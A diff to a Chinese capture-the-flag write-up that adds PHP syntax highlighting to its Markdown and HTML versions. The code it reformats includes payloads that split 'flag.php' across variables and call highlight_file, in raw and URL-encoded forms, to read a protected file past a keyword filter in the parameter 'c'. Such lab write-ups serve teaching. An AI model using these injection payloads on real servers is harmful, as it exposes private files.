@@ -38,11 +38,11 @@ if(isset($_GET['c'])){
 ```
 但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
 
-```
+```php
 $a='fla'; $b='g.php'; highlight_file($a.$b);
 ```
 改造一下加上第三个变量：
-```
+```php
 $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 ```
 
@@ -51,7 +51,7 @@ $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 /?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
 ```
 或者我们可以把空格去掉：
-```
+```php
 $a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
 ```
 浏览器自动 URL 编码后的 Payload 会更简单明了一点：
@@ -104,11 +104,11 @@ if(isset($_GET['c'])){
 ```
 但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
 
-```
+```php
 $a='fla'; $b='g.php'; highlight_file($a.$b);
 ```
 改造一下加上第三个变量：
-```
+```php
 $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 ```
 
@@ -117,7 +117,7 @@ $a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
 /?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
 ```
 或者我们可以把空格去掉：
-```
+```php
 $a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
 ```
 浏览器自动 URL 编码后的 Payload 会更简单明了一点：
@@ -236,17 +236,14 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <span class="pl-en">highlight_file</span>(<span class="pl-c1">__FILE__</span>);
 }</pre></div>
 <p>但是我上一题本来就没用 <code class="notranslate">system</code> 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：</p>
-<pre class="notranslate"><code class="notranslate">$a='fla'; $b='g.php'; highlight_file($a.$b);
-</code></pre>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>a</span>=<span class="pl-s">'<span class="pl-s">fla</span>'</span>; <span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s">'<span class="pl-s">g.php</span>'</span>; <span class="pl-en">highlight_file</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>.<span class="pl-s1"><span class="pl-c1">$</span>b</span>);</pre></div>
 <p>改造一下加上第三个变量：</p>
-<pre class="notranslate"><code class="notranslate">$a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
-</code></pre>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>a</span>=<span class="pl-s">'<span class="pl-s">fla</span>'</span>; <span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s">'<span class="pl-s">g.ph</span>'</span>; <span class="pl-s1"><span class="pl-c1">$</span>c</span>=<span class="pl-s">'<span class="pl-s">p</span>'</span>; <span class="pl-en">highlight_file</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>.<span class="pl-s1"><span class="pl-c1">$</span>b</span>.<span class="pl-s1"><span class="pl-c1">$</span>c</span>);</pre></div>
 <p>浏览器自动 URL 编码后的 Payload：</p>
 <pre class="notranslate"><code class="notranslate">/?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
 </code></pre>
 <p>或者我们可以把空格去掉：</p>
-<pre class="notranslate"><code class="notranslate">$a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
-</code></pre>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>a</span>=<span class="pl-s">'<span class="pl-s">fla</span>'</span>;<span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s">'<span class="pl-s">g.ph</span>'</span>;<span class="pl-s1"><span class="pl-c1">$</span>c</span>=<span class="pl-s">'<span class="pl-s">p</span>'</span>;<span class="pl-en">highlight_file</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>.<span class="pl-s1"><span class="pl-c1">$</span>b</span>.<span class="pl-s1"><span class="pl-c1">$</span>c</span>);</pre></div>
 <p>浏览器自动 URL 编码后的 Payload 会更简单明了一点：</p>
 <pre class="notranslate"><code class="notranslate">/?c=$a=%27fla%27;$b=%27g.ph%27;$c=%27p%27;highlight_file($a.$b.$c);
 </code></pre>
